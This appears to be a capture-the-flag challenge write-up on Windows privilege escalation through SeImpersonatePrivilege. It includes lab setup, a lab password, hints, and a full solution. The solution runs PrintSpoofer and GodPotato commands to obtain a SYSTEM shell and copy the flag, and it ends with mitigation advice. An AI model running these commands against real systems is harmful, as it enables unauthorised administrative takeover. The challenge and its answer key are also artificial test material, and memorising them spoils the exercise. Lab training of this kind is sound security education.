# Challenge 1 — SeImpersonatePrivilege (PrintSpoofer / GodPotato)

**Difficulty:** Hard
**Category:** Windows Privilege Escalation — Token Impersonation
**Flag:** `C:\CTF\candyland_vault\broomhilda.txt`

---

## Story

You are **Django**. You've compromised a web application running as `schultz` —
Dr. King Schultz's service account. Schultz is a bounty hunter. He has access.
But the vault holding Broomhilda requires SYSTEM.

Service accounts in Windows are often granted `SeImpersonatePrivilege` —
the right to impersonate other users. Candie's sysadmin left it enabled.
That was his last mistake.

---

## Setup

1. Start a **Windows VM** with IIS installed, or Windows Server 2019/2022
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Reboot the VM once (required for privilege assignment to apply)
4. Log in as `schultz` / `Schultz1858!`

### Required tools — download to the VM before starting

| Tool | Source |
|------|--------|
| PrintSpoofer64.exe | https://github.com/itm4n/PrintSpoofer/releases |
| GodPotato.exe | https://github.com/BeichenDream/GodPotato/releases |

---

## Background: SeImpersonatePrivilege

`SeImpersonatePrivilege` allows a process to impersonate the security context of another
user after obtaining their token. It is legitimately granted to service accounts
(IIS, MSSQL, network services) so they can act on behalf of connecting users.

The **Potato family** of exploits (Hot Potato, Juicy Potato, Rogue Potato, Sweet Potato,
GodPotato) and **PrintSpoofer** all exploit this privilege by:

1. Coercing the SYSTEM account into authenticating to an attacker-controlled endpoint
2. Capturing the SYSTEM token from that authentication
3. Calling `ImpersonateNamedPipeClient()` or equivalent — which the privilege allows
4. Using the SYSTEM token to execute arbitrary commands

---

## Hints

<details>
<summary>Hint 1</summary>
Confirm the privilege exists on your account:

```cmd
whoami /priv
```

Look for `SeImpersonatePrivilege` with status `Enabled`.
</details>

<details>
<summary>Hint 2 — PrintSpoofer</summary>
PrintSpoofer abuses the Print Spooler service to coerce SYSTEM authentication:

```cmd
PrintSpoofer64.exe -i -c cmd
```

`-i` = interactive, `-c cmd` = spawn cmd.exe as SYSTEM.
</details>

<details>
<summary>Hint 3 — GodPotato (works on Windows 10/11 and Server 2022 where PrintSpoofer may not)</summary>

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c copy C:\CTF\candyland_vault\broomhilda.txt C:\Users\Public\flag.txt"
```
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Verify the privilege

```cmd
whoami /priv
```

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

### Step 2a — Exploit with PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c cmd
```

A new cmd.exe window opens. Run:
```cmd
whoami
```
```
nt authority\system
```

### Step 2b — Exploit with GodPotato (alternative)

```cmd
GodPotato.exe -cmd "cmd /c copy C:\CTF\candyland_vault\broomhilda.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F"
```

### Step 3 — Read the flag

```powershell
type C:\CTF\candyland_vault\broomhilda.txt
# or after copy:
type C:\Users\Public\flag.txt
```

```
CTF{p0t4t0_k1ng_dj4ng0_1mp3rs0n4t3d_SYSTEM}
```

### Why this works

`SeImpersonatePrivilege` was designed for legitimate service account delegation.
The Potato/PrintSpoofer attacks exploit the fact that SYSTEM-level processes
(like the Print Spooler) can be tricked into authenticating to a local named pipe
or COM endpoint the attacker controls. Once SYSTEM authenticates, the attacker's
process captures the token and impersonates it — which the OS permits because the
account holds `SeImpersonatePrivilege`. Mitigation: run web/database services
under accounts that do not hold this privilege, or isolate them using Virtual
Service Accounts or Group Managed Service Accounts (gMSA).

</details>
